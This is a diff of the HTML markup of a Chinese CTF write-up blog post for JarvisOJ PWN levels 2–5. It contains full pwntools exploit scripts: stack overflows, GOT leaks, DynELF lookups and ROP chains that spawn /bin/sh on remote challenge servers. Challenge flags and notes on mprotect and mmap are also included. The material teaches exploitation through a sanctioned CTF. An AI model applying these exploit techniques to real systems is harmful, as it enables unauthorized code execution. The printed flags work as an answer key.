-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./level2")</span></div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9878</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line">bin_sh_addr = <span class="number">0x804A024</span></div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += <span class="string">"\x00"</span>*<span class="number">4</span></div><div class="line">payload += p32(<span class="number">0x804845C</span>)</div><div class="line">payload += p32(bin_sh_addr)</div><div class="line">respone(<span class="string">"Input:\n"</span>,payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./level2")</span></span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9878</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line">bin_sh_addr = <span class="number">0x804A024</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += <span class="string">"\x00"</span>*<span class="number">4</span></span><br><span class="line">payload += p32(<span class="number">0x804845C</span>)</span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line">respone(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>FLag: CTF{1759d0cbd854c54ffa886cd9df3a3d52}</strong></p>
 <h1 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h1>
 <p>这次给了<code>libc</code><br>
 老套路，还是给出了漏洞函数，只有栈溢出和<code>write</code>函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这次给出了<code>libc</code>，思路也很明显。</p>
 <ol>
 <li>用<code>write</code>函数泄露出<code>write</code>的真实内存地址(通过泄露got表中对应的write条目实现)</li>
@@ -530,13 +277,13 @@ poc:</p>
 详细控制过程看poc注释<br>
 poc:</li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./level3")</span></div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9879</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">elf = ELF(<span class="string">"./level3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line">		</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += <span class="string">"\x00\x00\x00\x00"</span></div><div class="line">payload += p32(elf.plt[<span class="string">'write'</span>])<span class="comment">#跳到write plt执行write函数</span></div><div class="line">payload +=p32(<span class="number">0x8048495</span>)<span class="comment">#执行完write之后的返回地址，此处为vulnerable_function()地址</span></div><div class="line">payload +=p32(<span class="number">1</span>)<span class="comment">#arg1</span></div><div class="line">payload +=p32(elf.got[<span class="string">'write'</span>])<span class="comment">#arg2</span></div><div class="line">payload +=p32(<span class="number">4</span>)<span class="comment">#arg3</span></div><div class="line"><span class="comment">#得到write的真实内存地址</span></div><div class="line">respone(<span class="string">"Input:\n"</span>,payload)</div><div class="line">write_addr = u32(pro.recv(<span class="number">4</span>))</div><div class="line"></div><div class="line"><span class="comment">#通过libc中函数之前偏移，计算system地址和字符串"/bin/sh"地址</span></div><div class="line">log.info(<span class="string">"write_addr:%s"</span>,hex(write_addr))</div><div class="line">imageBase = write_addr - libc.symbols[<span class="string">'write'</span>]<span class="comment">#得到libc内存加载基址</span></div><div class="line">log.info(<span class="string">"imageBase:%s"</span>,hex(imageBase))</div><div class="line">system_addr = imageBase + libc.symbols[<span class="string">'system'</span>]<span class="comment">#计算system真实地址</span></div><div class="line">bin_sh_addr = imageBase + next(libc.search(<span class="string">'/bin/sh'</span>))<span class="comment">#计算/bin/sh真实地址</span></div><div class="line">log.info(<span class="string">"system_addr:%s"</span>,hex(system_addr))</div><div class="line">log.info(<span class="string">"bin_sh_addr:%s"</span>,hex(bin_sh_addr))</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += <span class="string">"\x00\x00\x00\x00"</span></div><div class="line">payload += p32(system_addr)<span class="comment">#劫持到system地址</span></div><div class="line">payload += p32(<span class="number">0xf</span>)<span class="comment">#随便给个调用完system后的返回地址</span></div><div class="line">payload +=p32(bin_sh_addr)<span class="comment">#arg1</span></div><div class="line">respone(<span class="string">"Input:\n"</span>,payload)<span class="comment">#再次溢出</span></div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./level3")</span></span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9879</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line">		</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += <span class="string">"\x00\x00\x00\x00"</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'write'</span>])<span class="comment">#跳到write plt执行write函数</span></span><br><span class="line">payload +=p32(<span class="number">0x8048495</span>)<span class="comment">#执行完write之后的返回地址，此处为vulnerable_function()地址</span></span><br><span class="line">payload +=p32(<span class="number">1</span>)<span class="comment">#arg1</span></span><br><span class="line">payload +=p32(elf.got[<span class="string">'write'</span>])<span class="comment">#arg2</span></span><br><span class="line">payload +=p32(<span class="number">4</span>)<span class="comment">#arg3</span></span><br><span class="line"><span class="comment">#得到write的真实内存地址</span></span><br><span class="line">respone(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">write_addr = u32(pro.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过libc中函数之前偏移，计算system地址和字符串"/bin/sh"地址</span></span><br><span class="line">log.info(<span class="string">"write_addr:%s"</span>,hex(write_addr))</span><br><span class="line">imageBase = write_addr - libc.symbols[<span class="string">'write'</span>]<span class="comment">#得到libc内存加载基址</span></span><br><span class="line">log.info(<span class="string">"imageBase:%s"</span>,hex(imageBase))</span><br><span class="line">system_addr = imageBase + libc.symbols[<span class="string">'system'</span>]<span class="comment">#计算system真实地址</span></span><br><span class="line">bin_sh_addr = imageBase + next(libc.search(<span class="string">'/bin/sh'</span>))<span class="comment">#计算/bin/sh真实地址</span></span><br><span class="line">log.info(<span class="string">"system_addr:%s"</span>,hex(system_addr))</span><br><span class="line">log.info(<span class="string">"bin_sh_addr:%s"</span>,hex(bin_sh_addr))</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += <span class="string">"\x00\x00\x00\x00"</span></span><br><span class="line">payload += p32(system_addr)<span class="comment">#劫持到system地址</span></span><br><span class="line">payload += p32(<span class="number">0xf</span>)<span class="comment">#随便给个调用完system后的返回地址</span></span><br><span class="line">payload +=p32(bin_sh_addr)<span class="comment">#arg1</span></span><br><span class="line">respone(<span class="string">"Input:\n"</span>,payload)<span class="comment">#再次溢出</span></span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>Flag: CTF{d85346df5770f56f69025bc3f5f1d3d0}</strong></p>
 <h1 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h1>
 <p>一样给出存在溢出漏洞的函数,但是没有给<code>libc</code>和其他任何提示<br>
 plt中存在<code>read</code>和<code>write</code>函数</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-30-17.jpg" alt="19-30-17.jpg" title="">
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/19-30-17.jpg" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>既然这样，我们只能在无<code>libc</code>的情况下的ROP<br>
 我们有两个选择</p>
 <blockquote>
@@ -555,22 +302,22 @@ pwntools中的DynELF是利用可循环利用的泄露内存函数去遍历获取
 32位程序需要将eax=0xb，ebx=&quot;/bin/sh&quot;字符串地址,ecx=0,edx=0,然后调用<code>syscall</code><br>
 64位则需要将rdi=&quot;/bin/sh&quot;字符串地址,rsi=0,rdx=0,然后同样调用<code>syscall</code><br>
 我则采用方法一写的poc(因为方法二的成功率看起来并不是很高，在没有办法的时候可采用)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./level4")</span></div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9880</span>)</div><div class="line"><span class="comment">#context.log_level = 'debug'</span></div><div class="line">elf = ELF(<span class="string">"./level4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line"><span class="comment">#泄露内存函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">	payload += <span class="string">"\x00\x00\x00\x00"</span></div><div class="line">	payload += p32(elf.plt[<span class="string">'write'</span>])</div><div class="line">	payload +=p32(<span class="number">0x0804844B</span>) <span class="comment">#return read Address，回到vulnerable_function</span></div><div class="line">	payload +=p32(<span class="number">1</span>)<span class="comment">#arg1</span></div><div class="line">	payload +=p32(address)<span class="comment">#arg2</span></div><div class="line">	payload +=p32(<span class="number">4</span>)<span class="comment">#arg3</span></div><div class="line">	pro.sendline(payload)</div><div class="line">	data  = pro.recv(<span class="number">4</span>)</div><div class="line">	<span class="keyword">return</span> data</div><div class="line">	</div><div class="line">d = DynELF(leak,elf=ELF(<span class="string">"./level4"</span>))</div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">log.info(hex(system_addr))</div><div class="line"></div><div class="line">data_bin_sh_addr =  <span class="number">0x804a01c</span></div><div class="line">pop_3_ret_addr = <span class="number">0x8048509</span></div><div class="line"></div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += <span class="string">"\x00\x00\x00\x00"</span></div><div class="line">payload += p32(elf.plt[<span class="string">'read'</span>])</div><div class="line">payload +=p32(pop_3_ret_addr) <span class="comment">#32位程序需要堆栈平衡，不然read的三个参数会一直留在栈上</span></div><div class="line">payload +=p32(<span class="number">0</span>)</div><div class="line">payload +=p32(data_bin_sh_addr)</div><div class="line">payload +=p32(<span class="number">8</span>)</div><div class="line"><span class="comment">#堆栈平衡后继续劫持到system_addr</span></div><div class="line">payload += p32(system_addr)</div><div class="line">payload +=p32(<span class="number">0xf</span>)<span class="comment">#随便一个返回地址</span></div><div class="line">payload +=p32(data_bin_sh_addr)<span class="comment">#/bin/sh字符串地址</span></div><div class="line"></div><div class="line">pro.sendline(payload)</div><div class="line">pro.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./level4")</span></span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9880</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line"><span class="comment">#泄露内存函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">	payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">	payload += <span class="string">"\x00\x00\x00\x00"</span></span><br><span class="line">	payload += p32(elf.plt[<span class="string">'write'</span>])</span><br><span class="line">	payload +=p32(<span class="number">0x0804844B</span>) <span class="comment">#return read Address，回到vulnerable_function</span></span><br><span class="line">	payload +=p32(<span class="number">1</span>)<span class="comment">#arg1</span></span><br><span class="line">	payload +=p32(address)<span class="comment">#arg2</span></span><br><span class="line">	payload +=p32(<span class="number">4</span>)<span class="comment">#arg3</span></span><br><span class="line">	pro.sendline(payload)</span><br><span class="line">	data  = pro.recv(<span class="number">4</span>)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">	</span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">log.info(hex(system_addr))</span><br><span class="line"></span><br><span class="line">data_bin_sh_addr =  <span class="number">0x804a01c</span></span><br><span class="line">pop_3_ret_addr = <span class="number">0x8048509</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += <span class="string">"\x00\x00\x00\x00"</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'read'</span>])</span><br><span class="line">payload +=p32(pop_3_ret_addr) <span class="comment">#32位程序需要堆栈平衡，不然read的三个参数会一直留在栈上</span></span><br><span class="line">payload +=p32(<span class="number">0</span>)</span><br><span class="line">payload +=p32(data_bin_sh_addr)</span><br><span class="line">payload +=p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#堆栈平衡后继续劫持到system_addr</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload +=p32(<span class="number">0xf</span>)<span class="comment">#随便一个返回地址</span></span><br><span class="line">payload +=p32(data_bin_sh_addr)<span class="comment">#/bin/sh字符串地址</span></span><br><span class="line"></span><br><span class="line">pro.sendline(payload)</span><br><span class="line">pro.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p>注意到<code>leak</code>函数并没有进行堆栈平衡，<code>leak</code>的执行会让栈空间一直往低地址增长，一次多三个参数。更好的<code>payload</code>应该是要做堆栈平衡，以免<code>leak</code>函数执行次数过多，造成不可预知意外<br>
 <strong>Flag: CTF{882130cf51d65fb705440b218e94e98e}</strong></p>
 <h1 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h1>
 <p>这次换成了64位的程序，和接下来的<code>level3 x64</code>的附件是一样的，包括程序和<code>libc</code><br>
 这次仍然给出了一个具有栈溢出漏洞的函数,但是题目要求假设<code>system</code>和<code>execve</code>被禁用，利用<code>mprotect</code>和<code>mmap</code>来解决</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>LL);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>先来了解一下<code>mprotect</code>和<code>mmap</code>函数</p>
 <h2 id="mprotect"><a class="markdownIt-Anchor" href="#mprotect"></a> mprotect</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
 <p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。<br>
 mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值,就是常见的0x111对应执行，写，读权限</p>
 <pre><code> 需要注意的是第一个参数――起始地址`start`必须是内存对齐的地址，且第二参数`len`也是内存对齐Align的整数倍。linux64bit默认内存对齐长度是0x1000(4096),32bit则是0x400(1024)。一开始没注意到这个，浪费了不少时间。
 </code></pre>
 <h2 id="mmap"><a class="markdownIt-Anchor" href="#mmap"></a> mmap</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">( <span class="keyword">void</span> *start , <span class="keyword">size_t</span> length , <span class="keyword">int</span> prot , <span class="keyword">int</span> flags , <span class="keyword">int</span> fd , <span class="keyword">off_t</span> offsize)</span></span></div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">( <span class="keyword">void</span> *start , <span class="keyword">size_t</span> length , <span class="keyword">int</span> prot , <span class="keyword">int</span> flags , <span class="keyword">int</span> fd , <span class="keyword">off_t</span> offsize)</span></span></span><br></pre></td></tr></table></figure>
 <p>参数start：</p>
 <ul>
 <li>指向欲映像的内存起始地址，通常设为NULL，代表让系统自动标明地址，映像成功后返回该地址。</li>
@@ -604,17 +351,17 @@ mprotect()函数把自start开始的、长度为len的内存区的保护属性�
 <li>若映像成功则返回映像区的内存起始地址，否则返回MAP_FAILED（－1），错误原因存于errno中。</li>
 </ul>
 <p>上一张图说明mmap的具体作用是什么：</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-43-47.jpg" alt="14-43-47.jpg" title="">
-<p>现在我们可以知道，mmap的作用就是<strong>将文件态的部分映射到程序的虚拟空间中</strong>(程序虚拟空间指的是程序可见的地址，包括已分配和可以被分配的两部分内存，即我们操作系统里面所说的程序可占有4G大小的虚拟内存)，然后通过设<code>mmap</code>的参数<code>flags</code>和<code>port</code>就可以控制映射到虚拟空间中的内存的执行、读写权限以及是否修改源文件，是否共享或者私有(用到咱们学的<code>copy-on-write</code>技术，即写时拷贝，每个程序试图修改时才会产生一个拷贝副本)，是否锁定（不允许页置换）等属性。还不理解可以结合in nek大佬在知乎上对<code>mmap</code>函数的解释来理解。<a href="https://www.zhihu.com/question/48161206" target="_blank" rel="external">知乎- Linux 中 mmap() 函数的内存映射问题理解？-in nek 的回答</a><br>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-43-47.jpg" alt=""><br>
+现在我们可以知道，mmap的作用就是<strong>将文件态的部分映射到程序的虚拟空间中</strong>(程序虚拟空间指的是程序可见的地址，包括已分配和可以被分配的两部分内存，即我们操作系统里面所说的程序可占有4G大小的虚拟内存)，然后通过设<code>mmap</code>的参数<code>flags</code>和<code>port</code>就可以控制映射到虚拟空间中的内存的执行、读写权限以及是否修改源文件，是否共享或者私有(用到咱们学的<code>copy-on-write</code>技术，即写时拷贝，每个程序试图修改时才会产生一个拷贝副本)，是否锁定（不允许页置换）等属性。还不理解可以结合in nek大佬在知乎上对<code>mmap</code>函数的解释来理解。<a href="https://www.zhihu.com/question/48161206" target="_blank" rel="noopener">知乎- Linux 中 mmap() 函数的内存映射问题理解？-in nek 的回答</a><br>
